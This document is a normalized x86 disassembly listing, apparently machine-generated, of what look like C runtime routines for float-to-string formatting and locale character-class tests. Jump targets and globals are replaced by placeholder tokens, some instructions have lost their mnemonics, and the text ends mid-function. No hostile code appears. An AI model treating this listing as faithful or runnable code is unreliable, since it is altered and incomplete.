mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_41fade
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_420260
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_420e20
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_420e20
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_4105f0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_420e20
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_420d40
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_420d40
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_420d40
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41fe74
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fafe
add esp 0x18
pop ebp
retn
sub_41fe94
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_40d831
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_413290
inc eax
push eax
push esi
push ebx
call sub_40ba70
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_413290
inc eax
push eax
push esi
push ebx
call sub_40ba70
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_41f871
push edi
push 0x30
push ebx
call sub_4105f0
add esp 0xc
sub_41ff97
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_420ca6
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_40d1fa
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_40d1fa
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_420b40
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_41fe94
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_420075
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_420ca6
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_40d1fa
mov [ eax ] edi
call sub_40e72d
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_420b40
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41f8b6
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41fe94
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_420162
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420075
add esp 0x18
pop ebp
retn
sub_420182
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fa17
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ff97
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fafe
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420075
jmp r-xdata
sub_42020a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420182
add esp 0x1c
pop ebp
retn
sub_42022d
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_420e3f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_40e6c1
sub_420260
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_42028d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
lea eax [ ebp - 0x10 ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4202e3
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42028d
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
pop ebp
retn
sub_420313
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_420364
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420313
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_420392
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4203e3
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420392
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_420411
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_420462
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420411
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_420490
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4204e6
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420490
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_420516
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_420567
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420516
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_420595
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x10
lea eax [ ebp - 0x10 ]
push eax
push 0x10
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4205e6
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420595
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x10
pop ebp
retn
sub_420614
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_42066a
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420614
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_42069a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x157
lea eax [ ebp - 0x10 ]
push eax
push 0x157
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4206f0
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42069a
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x157
pop ebp
retn
sub_420720
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x117
lea eax [ ebp - 0x10 ]
push eax
push 0x117
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_420776
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_420720
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x117
pop ebp
retn
sub_4207a6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40d831
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x20
lea eax [ ebp - 0x10 ]
push eax
push 0x20
push [ ebp + 0x8 ]
call sub_41813b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4207f7
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4207a6
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
and eax 0x20
pop ebp
retn
sub_420844
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42028d
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_420867
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4202e3
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_420886
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420614
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4208a9
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_42066a
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4208ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_40d831
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4227f8
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_42169a
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
sub_420989
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_40d831
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push 0x1
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4227f8
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_42213c
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
sub_420a49
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_40d831
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4227f8
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_421beb
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
sub_420b08
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ rwxdata ]
test eax 0xfffffffe
je r-xdata
mov [ rwxdata ] eax
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_420b40
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
